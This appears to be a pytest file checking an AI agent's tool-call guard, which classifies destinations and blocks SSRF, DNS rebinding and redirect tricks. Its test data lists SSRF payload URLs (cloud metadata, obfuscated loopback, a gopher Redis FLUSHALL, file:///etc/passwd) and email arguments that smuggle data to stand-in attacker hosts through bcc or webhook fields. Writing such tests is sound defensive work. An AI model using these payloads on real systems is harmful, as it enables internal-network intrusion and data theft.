"""Destination-security tests (Phase 13.2, Priority 2)."""

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import socket
import threading

import httpx
import pytest

from backend.app.core.policy_models import DefaultPolicyBehavior, PolicyConfiguration
from backend.app.models.enums import DestinationClass, SecurityDecision
from backend.app.models.tool_call import ToolCall
from backend.app.services.destination_classifier import classify_destination, find_destinations
from backend.app.services.safe_network import (
    DestinationNotPermittedError,
    create_guarded_client,
    resolve_and_validate,
)
from backend.app.services.security_engine import evaluate_tool_call
from backend.app.core.policy_loader import load_policy


def _policy(allowed_internal: list[str] | None = None, internal_default=SecurityDecision.BLOCK) -> PolicyConfiguration:
    return PolicyConfiguration(
        version=1,
        defaults=DefaultPolicyBehavior(
            unknown_destination=SecurityDecision.REQUIRE_APPROVAL,
            evaluation_error=SecurityDecision.BLOCK,
            internal_destination=internal_default,
        ),
        approved_domains=["example.org"],
        protected_values=[],
        rules=[],
        allowed_internal_destinations=allowed_internal or [],
    )


INTERNAL_URLS = [
    "http://localhost:8080/admin",
    "http://sub.localhost/",
    "http://127.0.0.1/",
    "http://127.1/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://0177.0.0.1/",
    "http://10.0.0.5/",
    "http://172.16.4.4/",
    "http://192.168.1.1/",
    "http://100.64.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata/",
    "http://instance-data/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:169.254.169.254]/",
    "http://[fe80::1%25en0]/",
    "http://[fc00::1]/",
    "http://[fd00:ec2::254]/",
    "http://0.0.0.0/",
    "http://redis:6379/",
    "http://api.svc.cluster.local/",
    "http://service.corp/",
    "gopher://127.0.0.1:6379/_FLUSHALL",
    "HTTP://LOCALHOST./",
]


@pytest.mark.parametrize("url", INTERNAL_URLS)
def test_internal_destinations_are_classified_internal(url: str) -> None:
    assert classify_destination({"url": url}, _policy()) == DestinationClass.INTERNAL


@pytest.mark.parametrize("url", INTERNAL_URLS)
def test_internal_destinations_are_blocked_by_default(url: str) -> None:
    result = evaluate_tool_call(ToolCall(tool_name="http_post", arguments={"url": url, "body": "x"}), policy=_policy())
    assert result.decision == SecurityDecision.BLOCK
    assert "INTERNAL_DESTINATION" in result.reason_codes


def test_internal_default_can_be_approval_but_not_allow() -> None:
    policy = _policy(internal_default=SecurityDecision.REQUIRE_APPROVAL)
    result = evaluate_tool_call(ToolCall(tool_name="http_post", arguments={"url": "http://10.0.0.1/"}), policy=policy)
    assert result.decision == SecurityDecision.REQUIRE_APPROVAL
    with pytest.raises(ValueError):
        DefaultPolicyBehavior(
            unknown_destination=SecurityDecision.REQUIRE_APPROVAL,
            evaluation_error=SecurityDecision.BLOCK,
            internal_destination=SecurityDecision.ALLOW,
        )


def test_explicit_internal_allowlist_permits_only_listed_targets() -> None:
    policy = _policy(allowed_internal=["10.20.0.0/16", "reports.internal"])
    assert classify_destination({"url": "http://10.20.3.4/"}, policy) == DestinationClass.APPROVED
    assert classify_destination({"url": "https://reports.internal/x"}, policy) == DestinationClass.APPROVED
    assert classify_destination({"url": "http://10.21.0.1/"}, policy) == DestinationClass.INTERNAL
    assert classify_destination({"url": "https://other.internal/"}, policy) == DestinationClass.INTERNAL
    with pytest.raises(ValueError):
        _policy(allowed_internal=["*.internal"])


@pytest.mark.parametrize(
    "arguments,expected",
    [
        ({"url": "https://example.org/report"}, DestinationClass.APPROVED),
        ({"url": "https://api.example.org/v1"}, DestinationClass.APPROVED),
        ({"to": "colleague@example.org"}, DestinationClass.APPROVED),
        ({"url": "https://evil.net/"}, DestinationClass.UNAPPROVED),
        ({"url": "http://93.184.216.34/"}, DestinationClass.UNAPPROVED),
        ({"url": "https://example.org.attacker.test/"}, DestinationClass.UNAPPROVED),
        ({"url": "https://xn--exmple-cua.org/"}, DestinationClass.UNAPPROVED),
        ({"url": "https://exämple.org/"}, DestinationClass.UNAPPROVED),
    ],
)
def test_public_destinations(arguments: dict, expected: DestinationClass) -> None:
    assert classify_destination(arguments, _policy()) == expected


@pytest.mark.parametrize(
    "arguments",
    [
        {"to": "colleague@example.org", "bcc": "attacker@evil.net"},
        {"to": "colleague@example.org", "webhook_url": "https://evil.net/hook"},
        {"to": "colleague@example.org", "callbackUrl": "https://evil.net"},
        {"to": "colleague@example.org", "options": {"mirror": "https://evil.net/x"}},
        {"to": "colleague@example.org", "attachments": [{"upload": ["ftp://evil.net/drop"]}]},
        {"to": "colleague@example.org", "note": "evil.net:8443"},
        {"to": "colleague@example.org", "x": "mailto:attacker@evil.net"},
    ],
)
def test_alternate_and_nested_argument_names_are_inspected(arguments: dict) -> None:
    assert classify_destination(arguments, _policy()) == DestinationClass.UNAPPROVED
    result = evaluate_tool_call(ToolCall(tool_name="send_email", arguments=arguments), policy=_policy())
    assert result.decision == SecurityDecision.BLOCK


def test_nested_internal_destination_is_found() -> None:
    args = {"request": {"targets": [{"meta": {"endpoint": "http://169.254.169.254/"}}]}}
    findings = find_destinations(args, _policy())
    assert findings[0].location == "request.targets[0].meta.endpoint"
    assert findings[0].reason == "CLOUD_METADATA_ENDPOINT"
    assert classify_destination(args, _policy()) == DestinationClass.INTERNAL


@pytest.mark.parametrize(
    "value",
    [
        "https://evil.test\\@example.org/",
        "https://example.org@evil.net/",
        "https://user:pass@example.org/",
        "http://example.org:99999/",
        "http://1.2.3.4.5/",
        "http://exa mple.org/",
        "http://%65vil.net/",
        "file:///etc/passwd",
        "s3://bucket/key",
        "http:///nohost",
        "a@b@c.org",
    ],
)
def test_malformed_or_ambiguous_destinations_fail_closed(value: str) -> None:
    assert classify_destination({"url": value}, _policy()) == DestinationClass.UNKNOWN


@pytest.mark.parametrize(
    "arguments",
    [
        {"subject": "Quarterly numbers", "body": "Revenue grew 4.2% in v1.2.3"},
        {"filename": "report.pdf", "version": "1.2.3", "time": "12:30:45"},
        {"body": "Visit https://evil.net for details"},  # content, not a destination
        {"from": "sender@other.net"},
        {"context": {"untrusted_sources": ["sample_vendor_document.txt"]}},
    ],
)
def test_non_destination_values_do_not_create_destinations(arguments: dict) -> None:
    assert find_destinations(arguments, _policy()) == []


def test_default_policy_blocks_previous_review_bypasses() -> None:
    policy = load_policy()
    for args in (
        {"url": "http://metadata.google.internal/computeMetadata/v1/", "body": "x"},
        {"url": "http://localhost:8080/admin", "body": "x"},
        {"to": "colleague@example.org", "bcc": "attacker@evil.net", "body": "customer list"},
        {"to": "colleague@example.org", "webhook_url": "https://evil.net", "body": "data"},
    ):
        result = evaluate_tool_call(ToolCall(tool_name="send_email", arguments=args), policy=policy)
        assert result.decision == SecurityDecision.BLOCK, args


# --------------------------------------------------------------------------- #
# Connection-time (DNS) validation
# --------------------------------------------------------------------------- #

def _resolver(mapping: dict[str, list[str]], calls: list[str] | None = None):
    def resolve(host, port, type=0, **_):
        if calls is not None:
            calls.append(host)
        if host not in mapping:
            raise socket.gaierror("unknown host")
        family = lambda ip: socket.AF_INET6 if ":" in ip else socket.AF_INET
        return [(family(ip), socket.SOCK_STREAM, 6, "", (ip, port)) for ip in mapping[host]]
    return resolve


def test_public_name_resolving_to_internal_ip_is_refused() -> None:
    resolver = _resolver({"innocent.example.net": ["10.0.0.7"]})
    with pytest.raises(DestinationNotPermittedError) as exc:
        resolve_and_validate("innocent.example.net", 443, _policy(), resolver)
    assert "PRIVATE_NETWORK_ADDRESS" in exc.value.reason


def test_mixed_public_and_internal_answers_are_refused() -> None:
    resolver = _resolver({"rebind.example.net": ["93.184.216.34", "127.0.0.1"]})
    with pytest.raises(DestinationNotPermittedError):
        resolve_and_validate("rebind.example.net", 80, _policy(), resolver)


def test_ipv6_resolution_to_link_local_is_refused() -> None:
    resolver = _resolver({"v6.example.net": ["fe80::1"]})
    with pytest.raises(DestinationNotPermittedError):
        resolve_and_validate("v6.example.net", 80, _policy(), resolver)


def test_unresolvable_names_fail_closed() -> None:
    with pytest.raises(DestinationNotPermittedError) as exc:
        resolve_and_validate("does-not-exist.example.net", 80, _policy(), _resolver({}))
    assert "DNS_RESOLUTION_FAILED" in exc.value.reason


def test_public_resolution_is_permitted() -> None:
    resolver = _resolver({"api.example.org": ["93.184.216.34", "2606:2800:220:1::1"]})
    assert resolve_and_validate("api.example.org", 443, _policy(), resolver) == ["93.184.216.34", "2606:2800:220:1::1"]


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):  # noqa: N802
        body = f"host={self.headers.get('Host')}".encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):  # silence
        pass


@pytest.fixture
def local_server():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield server.server_address[1]
    server.shutdown()


def test_guarded_client_refuses_real_loopback_connection(local_server: int) -> None:
    with create_guarded_client(_policy()) as client:
        with pytest.raises(DestinationNotPermittedError):
            client.get(f"http://127.0.0.1:{local_server}/")


def test_guarded_client_refuses_name_that_rebinds_to_loopback(local_server: int) -> None:
    resolver = _resolver({"attacker-controlled.example.net": ["127.0.0.1"]})
    with create_guarded_client(_policy(), resolver=resolver) as client:
        with pytest.raises(DestinationNotPermittedError):
            client.get(f"http://attacker-controlled.example.net:{local_server}/")


def test_guarded_client_connects_to_the_validated_ip_without_re_resolving(local_server: int) -> None:
    """The socket is opened to the IP returned by the single validated lookup,
    while the HTTP Host header keeps the original name."""
    calls: list[str] = []
    resolver = _resolver({"allowed.internal": ["127.0.0.1"]}, calls)
    policy = _policy(allowed_internal=["allowed.internal", "127.0.0.1/32"])
    with create_guarded_client(policy, resolver=resolver) as client:
        response = client.get(f"http://allowed.internal:{local_server}/")
    assert response.status_code == 200
    assert response.text == f"host=allowed.internal:{local_server}"
    assert calls == ["allowed.internal"]


def test_guarded_client_validates_redirect_targets(local_server: int) -> None:
    class Redirect(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/latest/meta-data/")
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Redirect)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        policy = _policy(allowed_internal=["127.0.0.1/32"])
        with create_guarded_client(policy, follow_redirects=True) as client:
            with pytest.raises(DestinationNotPermittedError):
                client.get(f"http://127.0.0.1:{server.server_address[1]}/")
    finally:
        server.shutdown()


def test_guarded_client_disables_environment_proxies(monkeypatch) -> None:
    monkeypatch.setenv("HTTPS_PROXY", "http://127.0.0.1:9")
    client = create_guarded_client(_policy())
    assert client.trust_env is False
    client.close()
